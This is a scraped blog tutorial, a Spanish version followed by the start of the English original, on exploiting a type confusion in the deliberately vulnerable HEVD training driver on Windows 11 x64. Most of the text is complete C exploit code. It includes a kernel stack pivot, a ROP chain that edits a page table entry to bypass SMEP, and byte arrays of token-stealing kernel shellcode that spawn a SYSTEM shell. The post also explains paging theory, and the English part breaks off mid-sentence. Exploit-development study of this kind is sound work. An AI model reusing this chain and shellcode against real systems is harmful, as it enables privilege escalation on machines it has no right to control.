_USER_TYPE_CONFUSION_OBJECT { uint64_t ObjectId; uint64_t ObjectType; } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* Exploit(): Type Confusion */ int Exploit(HANDLE hHEVD) { DWORD dwBytesReturned = 0; LPVOID lpvNtKrnl = NULL; LPVOID lpvAllocation = NULL; USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 }; lpvNtKrnl = GetKernelModuleBase(\u0026#34;ntoskrnl\u0026#34;); if (lpvNtKrnl == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of nt\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of nt: 0x%p\\n\u0026#34;, lpvNtKrnl); lpvAllocation = VirtualAlloc(NULL, 0x1000, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } memset(lpvAllocation, \u0026#39;C\u0026#39;, 0x1000); UserTypeConfusionObject.ObjectId = 0x4141414141414141; UserTypeConfusionObject.ObjectType = 0x4242424242424242; printf(\u0026#34;[*] Triggering Type Confusion\\n\u0026#34;); DeviceIoControl(hHEVD, TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[+] Exploitation successful, enjoy the shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[*] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != NULL) CloseHandle(hHEVD); return 0; } Plan de Ataque # Una vez ejecutado, podemos ver que obtuvimos control sobre el flujo de ejecución.\nPodemos ver que el registro RBX apunta a nuestro objeto / estructura. Mi idea aquí es que podemos realizar un \u0026ldquo;stack pivot\u0026rdquo; en una asignación que controlamos desde el área de usuario (por ejemplo, VirtualAlloc).\nEl Comienzo de Sufrimiento # Busquemos gadgets, usaremos nuestra herramienta favorita rp++, de 0vercl0k.\nC:\\\u0026gt;rp-win.exe --rop=20 --va=0 --file C:\\Windows\\System32\\ntoskrnl.exe \u0026gt; rop.txt Dado que es un archivo grande, pasemos lo a Linux. Si planeas analizarlo usando grep, necesitarás convertir este archivo a ASCII.\n$ file rop.txt rop.txt: Unicode text, UTF-16, little-endian text, with very long lines (388), with CRLF line terminators $ iconv -f utf-16 -t us-ascii//TRANSLIT rop.txt \u0026gt; rop_ascii.txt En este momento estaba completamente confundido porque las cosas no iban como hemos planeado. Revisé el blog de VulnDevs para ver qué habría hecho y usó un \u0026ldquo;gadget\u0026rdquo; interesante.\nQWORD STACK_PIVOT_GADGET = ntBase + 0x317f70; // mov esp, 0x48000000; add esp, 0x28; ret; Nunca había visto un gadget como este ni siquiera sabía que esto fuera posible\u0026hellip; hay algunas cosas que debemos tener en cuenta al usar un gadget como este.\nLa dirección debe estar alineada (address % 16 == 0) Debemos dar margen de maniobra para que el kernel lea / escriba en esta área de la memoria. (target_address - 0x1000) Debemos encerrar la región de memoria usando VirtualLock El código abajo hace precisamente eso.\n/* We\u0026#39;re going to be allocating memory at 0xF6C875C0-0x1000, we must do this to give the kernel room to read/write to this memory region */ lpvAllocTarget = (LPVOID)0xF6C875C0; lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000), 0x5000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } /* We lock the allocated memory region into RAM to avoid a page fault */ if (VirtualLock(lpvAllocation, 0x5000) == FALSE) { printf(\u0026#34;[*] Failed to lock virtual address space\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully locked 0x%p\\n\u0026#34;, lpvAllocation); RtlFillMemory((LPVOID)lpvAllocTarget, 0x4000, \u0026#39;A\u0026#39;); ... UserTypeConfusionObject.ObjectType = (uint64_t)lpvNtKrnl + 0x32e4fe; // mov esp, 0xF6C875C0 ; ret Una vez enviado, el pivote NO trabajó\u0026hellip;\nSi analizamos esto nos encontramos con una doble falta…\nA este punto pasó un mes y no llegaba a ninguna lugar\u0026hellip; hasta que encontré un blog por wafzsucks y finalmente todo se redujo a puntos de interrupción que rompían el exploit.\nUna vez que eliminé mi punto de interrupción, todo funcionó?\nTeoría # Aunque tenía un exploit funcional en este punto, quería entender por qué, así que decido recorrer el blog wafzsucks :)\nLo que sigue en esta sección son principalmente notas de wafzsucks. Quiero aser esto claro. Sin embargo, escribir notas es la forma en que yo aprendo.\nOperaciones Generales de Memoria # Según la información de Wikipedia, el kernel tiene acceso completo a la memoria del sistema. Es responsable de permitir que los procesos accedan a la memoria según sea necesario. Esto se hace mediante direccionamiento virtual (mediante paginación y/o segmentación).\nSegún Wikipedia, al utilizar este esquema (paginación), el sistema operativo obtiene información en bloques llamados páginas. Por ejemplo, en Windows una página tiene 4 KB (4006 o 0x1000 bytes).\nLo que hace el direccionamiento virtual es permitir que el kernel haga que una dirección física determinada parezca otra dirección, la dirección virtual.\nwafzsucks lo expresó perfectamente, es por eso que cuando se carga un juego, los fanáticos comienzan y se usa mucha memoria incluso antes de que comience el juego. Esto se debe a que la memoria se asigna y se obtiene mientras el juego se carga en dicha memoria.\nCon el uso de VirtualAlloc() en Windows y mmap() en Linux, podemos mapear un rango de memoria virtual en una dirección definida. Es por eso que esta solución es un enfoque sólido para el pivotamiento de el stack.\nMemoria Virtual # La imagen de abajo está tomada del blog de wafzsucks blog).\nPodemos ver en la imagen de arriba que una dirección virtual está asignada a múltiples regiones en la memoria física. En corto, el sistema operativo gestiona los espacios de direcciones virtuales y la asignación de memoria real. El hardware de traducción de direcciones en la CPU, a menudo denominado unidad de administración de memoria (MMU), traduce automáticamente direcciones virtuales en direcciones físicas.\nSegún Wikipedia, los beneficios de la memoria virtual incluyen:\nLas aplicaciones no tienen que administrar el espacio de memoria compartida Capacidad de compartir la memoria utilizada por las librerias entre procesos. Mayor seguridad debido al aislamiento de la memoria. Y conceptualmente poder utilizar más memoria de la que podría estar disponible físicamente, utilizando la técnica de paginación o segmentación.\nSumario de Memoria Paginada # Cuando escuchamos las palabras memoria paginada (Paged Memory) nos referimos a una técnica en la que el sistema operativo divide la memoria de un programa o sistema en bloques fijos llamados páginas (como sabemos). A continuación se muestran algunos conceptos clave a tener en cuenta con la memoria paginada:\nTabla de páginas (Page Table) Los sistemas operativos mantienen una estructura de información conocida como tabla de páginas. Esta tabla realiza un seguimiento de la asignación entre las direcciones de memoria virtual utilizadas por un programa y la ubicación de la dirección de memoria física donde se almacenan la información. Memoria virtual (Virtual Memory) Como se mencionó anteriormente, así es como los programas interactúan con la memoria física sin tocarla directamente. Básicamente traducir direcciones virtuales a direcciones físicas. Fallos de página (Page Faults) Cuando un programa accede a una página de memoria virtual que no está actualmente en la memoria física, se produce una falla de página. Desde aquí el control se transfiere del programa al sistema operativo. Paginación por demanda (Demand Paging) La mayoría de los sistemas operativos utilizan paginación exigente, que es donde las páginas sólo se cargan en la memoria cuando es necesario. Esto es para conservar la memoria física cargando SOLO páginas que se están utilizando activamente. Reemplazo de página (Page Replacement) Si la memoria física está llena, es posible que el sistema operativo deba elegir qué páginas eliminar de la memoria para dejar espacio para páginas nuevas. Tamaño de página (Page Size) El tamaño de cada página es un factor crucial en la eficiencia de la gestión de la memoria. Un tamaño de página más pequeño puede conducir a una administración de memoria más detallada, pero también puede generar una mayor sobrecarga debido a una tabla de páginas más grande. Un tamaño de página mayor puede reducir el tamaño de la tabla, pero puede provocar que se carguen más datos en la memoria incluso si solo se necesita una pequeña parte. Probando la Teoría # Revisemos nuestro ejemplo de código.\nlpvAllocTarget = (LPVOID)0xF6C875C0; lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000), 0x10000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } UserTypeConfusionObject.ObjectId = (uint64_t)lpvAllocation; UserTypeConfusionObject.ObjectType = (uint64_t)lpvNtKrnl + 0x32e4fe; // mov esp, 0xF6C875C0 ; ret printf(\u0026#34;[*] Triggering Type Confusion\\n\u0026#34;); DeviceIoControl(hHEVD, TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); Si verificamos el PTE de la nueva dirección de stack, veremos que NO ES una entrada de página válida.\nQue significa que el control se le dará al kernel y fallaremos!\nEsto es por la paginación de demanda mencionada anteriormente. Para que esta sea una página válida, podemos intentar escribir en la página anterior para evitar el error de página, ya que entonces estará en uso. Ate intentarlo!\nlpvAllocTarget = (LPVOID)0xF6C875C0; lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000), 0x10000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully created allocation: 0x%p\\n\u0026#34;, lpvAllocation); printf(\u0026#34;[*] Writing random buffer to prevous page\\n\u0026#34;); RtlFillMemory((lpvAllocTarget-0x1000), 0x1000, \u0026#39;A\u0026#39;); Esta vez, cuando llegamos al punto de interrupción, podemos ver que la página es válida :)\nSin embargo, todavía tenemos un choque? Aquí es donde entra VirtualLock.\nSin embargo, todavía tengo un choque! Según la información del blog de Kristal-G, parece que esta dirección es demasiado alta. Esto también se muestra en el error real anterior: con eso decidí cambiar mi gadget de pivote de stack.\nExplotación # Después de llorar un rato logré crear un exploit seguro como se muestra a abajo:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define TYPE_CONFUSION 0x222023 /* Structure used by Type Confusion */ typedef struct _USER_TYPE_CONFUSION_OBJECT { uint64_t ObjectId; uint64_t ObjectType; } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } void WriteGadgets(LPVOID lpvNt, LPVOID lpvBuffer) { uint64_t *rop = (uint64_t *)(lpvBuffer); uint64_t nt = (uint64_t)(lpvNt); uint8_t sc[129] = { // sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xb2, 0x04, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0x38, 0x90, 0x40, 0x04, 0x00, 0x00, 0x75, 0xeb, 0x48, 0x8b, 0x90, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, // sickle-tool -p windows/x64/kernel_sysret -f num (71) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07 }; LPVOID shellcode = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); RtlCopyMemory(shellcode, sc, 129); /* Prepare RDX register for later. This is needed for the XOR operation */ *rop++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret *rop++ = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR *rop++ = 0x000000; // [filler] *rop++ = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ *rop++ = nt + 0x57699c; // pop rcx ; ret *rop++ = (uint64_t)shellcode; // *shellcode *rop++ = nt + 0x24aaec; // MiGetPteAddress() /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ *rop++ = nt + 0x30fcf3; // sub rax, rdx ; ret *rop++ = nt + 0x54f344; // push rax ; pop rbx ; ret *rop++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret *rop++ = 0x000004; // 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found) *rop++ = 0x000000; // [filler] *rop++ = 0x000000; // [filler] *rop++ = nt + 0x3788b6; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret /* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */ for (int i = 0; i \u0026lt; 0xC; i++) { *rop++ = (uint64_t)shellcode; } } /* Exploit(): Type Confusion */ int Exploit(HANDLE hHEVD) { uint64_t *rop = NULL; BOOL bBlocked; DWORD dwBytesReturned = 0; LPVOID lpvNtKrnl = NULL; LPVOID lpvAllocation = NULL; LPVOID lpvAllocTarget = NULL; USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 }; lpvNtKrnl = GetKernelModuleBase(\u0026#34;ntoskrnl\u0026#34;); if (lpvNtKrnl == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of nt\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of nt: 0x%p\\n\u0026#34;, lpvNtKrnl); /* Allocate memory one page before the target memory region. This helps prevent the Double Fault; Logic here is avoid not triggering \u0026#34;Demand Paging\u0026#34;. */ lpvAllocTarget = (LPVOID)0x48000000; printf(\u0026#34;[*] Allocation to be made at 0x%p - PAGE_SIZE\\n\u0026#34;, lpvAllocTarget); lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000), 0x10000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully created allocation: 0x%p\\n\u0026#34;, lpvAllocation); /* Trigger the Type Confusion by overwriting the function pointer */ UserTypeConfusionObject.ObjectId = 0x4242424242424242; UserTypeConfusionObject.ObjectType = (uint64_t)lpvNtKrnl + 0x28d700; // mov esp, 0x48000000 ; add esp, 0x28 ; ret /* Let the Kernel breathe... this is needed to avoid a crash, my thoery is if we don\u0026#39;t do this the allocation will not be mapped properly. So what we need to do is sleep for a few seconds to allow this to happen! First time trying this I was under the impression VirtualLock was needed, but when testing it never locked? So after debugging I found this to be the solution. This exploit succeded 9/10 times vs the original 2/10 ;D */ printf(\u0026#34;[*] Letting the kernel breathe\u0026#34;); for (int i = 0; i \u0026lt; 4; i++) { putchar(\u0026#39;.\u0026#39;); Sleep(1000); } putchar(\u0026#39;\\n\u0026#39;); /* Fill the page before the target region with random data */ RtlFillMemory(lpvAllocation, 0x1000, \u0026#39;A\u0026#39;); /* Write the gadget chain at the location we return */ WriteGadgets(lpvNtKrnl, (lpvAllocTarget + 0x28)); printf(\u0026#34;[*] Triggering Type Confusion\\n\u0026#34;); DeviceIoControl(hHEVD, TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[+] Exploitation successful, enjoy the shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[*] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != NULL) CloseHandle(hHEVD); return 0; } Si me seguiste, teníamos una página válida? Entonces, por qué necesitábamos VirtualLock?\nBueno\u0026hellip; no era necesarios! El exploit mostrado arriba no utilizó la función VirtualLock. Durante la depuración vimos que la página era válida\u0026hellip; además VirtualLock nunca tuvo éxito\u0026hellip; Continuaba recibiendo el código de error ERROR_NOACCESS (0x3E6), lo que significa que la página nunca se \u0026ldquo;bloqueó\u0026rdquo;.\nSi consultas la documentación en MSDN verá que a veces se necesitan dos llamadas, debido a la forma en que funciona esta función. ¿Necesita mayores privilegios? No estoy seguro, pero lo eliminé para comprobar si hacía algo y, para mi sorpresa, no sea.\nAdemás, encontré que la explotación era realmente poco confiable. Para que funcione el 90% del tiempo (si no el 100%), qué se debe hacer?\nLo has adivinado! Una llamada a Sleep() :P\nMi teoría es que la asignación necesitaba tiempo para \u0026ldquo;registrarse\u0026rdquo;. Explotación se muestra a abajo!\nRecursos # https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f https://kristal-g.github.io/2021/02/20/HEVD_Type_Confusion_Windows_10_RS5_x64.html https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html ","date":"19 January 2025","externalUrl":null,"permalink":"/posts/0x06-acerc%C3%A1ndose-a-windows-kernel-type-confusions-modernos/","section":"Posts","summary":"","title":"0x06 - Acercándose a Windows Kernel Type Confusions Modernos","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! In the last tutorial we exploited a Type Confusion within the Windows 7 (x86) Kernel. Having obtained a solid foundation on approaching this vulnerability, we can now proceed to attempt exploitation on Windows 11 (x64).\nTable of Contents # Reverse Engineering Writing the Exploit Plan of Attack The Start of Suffering Thoery General Memory Operations Virtual Memory Paged Memory Summary Testing Theory Exploitation Sources Reverse Engineering # Let\u0026rsquo;s take a look at the vulnerable handler and respective structures.\nWe cannot ignore that we have a lot of background information (not to mention symbols). The only real difference we need to account for is the fact that the allocation will be 16 (0x10) bytes. This is because of the size of an unsigned long in an x64 environment.\nThat said, we can begin writing the proof of concept.\nWriting the Exploit # Below is a PoC we can begin working with:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define TYPE_CONFUSION 0x222023 /* Structure used by Type Confusion */ typedef struct _USER_TYPE_CONFUSION_OBJECT { uint64_t ObjectId; uint64_t ObjectType; } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT; /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* Exploit(): Type Confusion */ int Exploit(HANDLE hHEVD) { DWORD dwBytesReturned = 0; LPVOID lpvNtKrnl = NULL; LPVOID lpvAllocation = NULL; USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 }; lpvNtKrnl = GetKernelModuleBase(\u0026#34;ntoskrnl\u0026#34;); if (lpvNtKrnl == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of nt\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of nt: 0x%p\\n\u0026#34;, lpvNtKrnl); lpvAllocation = VirtualAlloc(NULL, 0x1000, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } memset(lpvAllocation, \u0026#39;C\u0026#39;, 0x1000); UserTypeConfusionObject.ObjectId = 0x4141414141414141; UserTypeConfusionObject.ObjectType = 0x4242424242424242; printf(\u0026#34;[*] Triggering Type Confusion\\n\u0026#34;); DeviceIoControl(hHEVD, TYPE_CONFUSION, \u0026amp;UserTypeConfusionObject, sizeof(UserTypeConfusionObject), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[+] Exploitation successful, enjoy the shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[*] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != NULL) CloseHandle(hHEVD); return 0; } Plan of Attack # Once ran, we can see we will have successfully gotten control over execution flow.\nWe can see that the RBX register points to our object / structure. My thought here is we can perform a stack pivot into an allocation we control from userland (e.g VirtualAlloc).\nThe Start of Suffering # Let\u0026rsquo;s look for gadgets, we\u0026rsquo;ll be using our favorite tool rp++, by 0vercl0k.\nC:\\\u0026gt;rp-win.exe --rop=20 --va=0 --file C:\\Windows\\System32\\ntoskrnl.exe \u0026gt; rop.txt Being that this is a large file, let\u0026rsquo;s move it over to Linux. If you plan to parse the output using grep, you\u0026rsquo;re going to need to convert this file to ASCII.\n$ file rop.txt rop.txt: Unicode text, UTF-16, little-endian text, with very long lines (388), with CRLF line terminators $ iconv -f utf-16 -t us-ascii//TRANSLIT rop.txt \u0026gt; rop_ascii.txt At this point I was utterly confused since things were not going as planned. I checked out VulnDevs blog to see what he would have done and he used a fairly intresting gadget.\nQWORD STACK_PIVOT_GADGET = ntBase + 0x317f70; // mov esp, 0x48000000; add esp, 0x28; ret; I had never seen a gadget like this nor, did I know this was even possible\u0026hellip; there\u0026rsquo;s a few things we have to keep in mind when using a gadget like this.\nThe address needs to be aligned (address % 16 == 0) We must give leeway room for the kernel to read/write to this area in memory (target_address - 0x1000) We must lock the memory region using VirtualLock The following code does just that.\n/* We\u0026#39;re going to be allocating memory at 0xF6C875C0-0x1000, we must do this to give the kernel room to read/write to this memory region */ lpvAllocTarget = (LPVOID)0xF6C875C0; lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000), 0x5000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); if (lpvAllocation == NULL) { printf(\u0026#34;[*] Failed to allocate memory\\n\u0026#34;); return -1; } /* We lock the allocated memory region into RAM to avoid a page fault */ if (VirtualLock(lpvAllocation, 0x5000) == FALSE) { printf(\u0026#34;[*] Failed to lock virtual address space\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully locked 0x%p\\n\u0026#34;, lpvAllocation); RtlFillMemory((LPVOID)lpvAllocTarget, 0x4000, \u0026#39;A\u0026#39;); ... UserTypeConfusionObject.ObjectType = (uint64_t)lpvNtKrnl + 0x32e4fe; // mov esp, 0xF6C875C0 ; ret Once sent, we DON\u0026rsquo;T have a successful pivot\u0026hellip;\nIf we analyze this we get a double fault\u0026hellip;\nAt this point a month passed and I was getting nowhere\u0026hellip; I mean nowhere\u0026hellip; until I came across a blog by wafzsucks and ultimately it came down to breakpoints breaking the exploit.\nOnce I removed my breakpoint everything worked?\nThoery # Although I had a working exploit at this point I wanted to understand why - so I decide to walk though wafzsucks blog :)\nWhat follows in this section are mostly the notes of wafzsucks I wanna make sure I make that clear. However since writing notes is the way I learn I decided to write my understanding as I go.\nGeneral Memory Operations # Based on information from Wikipedia the kernel has full access to the the systems memory. It\u0026rsquo;s responsible for allowing processes to access memory as it\u0026rsquo;s required. This is done via virtual addressing (via paging and/or segmentation).\nAccording to Wikipedia when using this scheme (paging) the OS gets information in blocks called pages. For example in Windows a page is 4KB (4006 or 0x1000 bytes).\nWhat virtual addressing is doing is allowing the kernel to make a given physical address appear to be another address, the virtual address.\nwafzsucks put it perfectly, this is why when a game is loaded, the fans kick off and a bunch of memory is used before the game even starts. This is because the memory is allocated and obtained while the game is loaded into said memory.\nWith the use of 